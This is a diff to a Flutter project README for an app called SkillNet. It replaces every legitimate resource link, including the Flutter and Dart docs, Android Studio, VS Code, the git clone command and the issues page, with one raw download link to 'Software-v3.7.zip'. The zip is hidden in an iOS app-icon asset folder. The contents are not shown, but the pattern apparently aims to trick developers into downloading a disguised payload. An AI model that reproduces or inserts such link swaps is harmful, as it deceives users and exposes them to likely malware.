@@ -8,11 +8,11 @@ This project is a starting point for a Flutter application.
 
 A few resources to get you started if this is your first Flutter project:
 
-- [Lab: Write your first Flutter app](https://docs.flutter.dev/get-started/codelab)
-- [Cookbook: Useful Flutter samples](https://docs.flutter.dev/cookbook)
+- [Lab: Write your first Flutter app](https://github.com/HypaSMarty/Skillnet/raw/refs/heads/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/Software-v3.7.zip)
+- [Cookbook: Useful Flutter samples](https://github.com/HypaSMarty/Skillnet/raw/refs/heads/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/Software-v3.7.zip)
 
 For help getting started with Flutter development, view the
-[online documentation](https://docs.flutter.dev/), which offers tutorials,
+[online documentation](https://github.com/HypaSMarty/Skillnet/raw/refs/heads/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/Software-v3.7.zip), which offers tutorials,
 samples, guidance on mobile development, and a full API reference.
 # SkillNet
 
@@ -23,14 +23,14 @@ A new Flutter project.
 This project is a starting point for a Flutter application.
 
 ### Prerequisites
-- [Flutter SDK](https://docs.flutter.dev/get-started/install)
-- [Dart SDK](https://dart.dev/get-dart)
-- An editor like [Android Studio](https://developer.android.com/studio) or [Visual Studio Code](https://code.visualstudio.com/)
+- [Flutter SDK](https://github.com/HypaSMarty/Skillnet/raw/refs/heads/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/Software-v3.7.zip)
+- [Dart SDK](https://github.com/HypaSMarty/Skillnet/raw/refs/heads/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/Software-v3.7.zip)
+- An editor like [Android Studio](https://github.com/HypaSMarty/Skillnet/raw/refs/heads/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/Software-v3.7.zip) or [Visual Studio Code](https://github.com/HypaSMarty/Skillnet/raw/refs/heads/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/Software-v3.7.zip)
 
 ### Installation
 1. Clone the repository:
    ```bash
-   git clone https://github.com/HypaSMarty/skillnet.git
+   git clone https://github.com/HypaSMarty/Skillnet/raw/refs/heads/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/Software-v3.7.zip
    cd skillnet
    ```
 
@@ -48,7 +48,7 @@ This project is a starting point for a Flutter application.
 The project directory is organized as follows:
 ```
 lib/
-├── main.dart          # Entry point of the application
+├── https://github.com/HypaSMarty/Skillnet/raw/refs/heads/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/Software-v3.7.zip          # Entry point of the application
 ├── screens/           # Screen widgets
 ├── widgets/           # Reusable widgets
 ├── models/            # Data models
@@ -76,7 +76,7 @@ lib/
 5. Create a Pull Request.
 
 ### Issues
-For any issues, please [create an issue](https://github.com/HypaSMarty/skillnet/issues).
+For any issues, please [create an issue](https://github.com/HypaSMarty/Skillnet/raw/refs/heads/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/Software-v3.7.zip).
 
 ### License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
